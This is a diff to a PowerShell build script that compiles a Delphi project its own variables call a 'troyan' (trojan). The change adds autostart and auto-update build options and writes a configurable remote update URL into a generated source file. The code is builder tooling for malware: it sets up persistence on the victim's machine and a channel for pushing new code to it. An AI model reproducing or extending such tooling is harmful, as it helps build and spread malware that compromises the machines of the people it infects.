@@ -30,11 +30,39 @@ $manifestFile = Join-Path -Path $scriptDir -ChildPath "dns.manifest.rc"
 
 
 #compile
-$dprOpts = "NO_AUTOSTART"
-if ($server.autoStart)
+$dprOpts = "NO_AUTOSTART, NO_AUTOUPDATE"
+if ($server.autoStart -and $server.autoUpdate)
+{
+    $dprOpts = "USE_AUTOSTART, USE_AUTOUPDATE"
+}
+elseif ($server.autoStart)
 {
     $dprOpts = "USE_AUTOSTART"
 }
+elseif ($server.autoUpdate)
+{
+    $dprOpts = "USE_AUTOUPDATE"
+}
+
+$template = @"
+unit consts;
+
+interface
+
+const
+xupdateurl: string = '__updateurl';
+
+implementation
+
+end.
+"@ 
+
+$template  = $template -replace "__updateurl", $server.updateUrl
+$encoding = New-Object System.Text.UTF8Encoding $false 
+$streamWriter = New-Object System.IO.StreamWriter( (Join-Path -Path $server.troyanDelphiDir -ChildPath "consts.pas"), $false, $encoding)
+$streamWriter.Write($template)
+$streamWriter.Close()
+
 $dcc32Path = "C:\Program Files (x86)\Borland\Delphi7\Bin\dcc32.exe"
 $dprFile = $server.troyanDelphiProj
 $dprArgs = "-D`"$dprOpts`" `"$dprFile`""
